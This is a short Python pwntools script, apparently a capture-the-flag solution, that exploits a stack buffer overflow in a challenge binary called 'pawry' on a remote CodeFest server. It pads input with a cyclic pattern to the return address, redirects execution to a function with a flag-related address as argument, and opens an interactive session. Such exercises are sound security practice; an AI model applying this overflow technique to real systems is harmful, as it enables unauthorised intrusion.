from pwn import *
from pwnlib.util.cyclic import cyclic, cyclic_find

# p = process("./pawry")
p = remote("chall.codefest.tech", 8686)

# input("attach gdb")

print(p.recv())
# # print(p.recv())

cat_flag = 0x804c028
abhi_ka_time = 0x80491e6

index = cyclic_find("haaa")
payload = cyclic()[:index]
payload += p32(abhi_ka_time) + b"AAAA" + p32(cat_flag)

# print(payload)

p.sendline(payload)
# print(payload)

p.interactive()

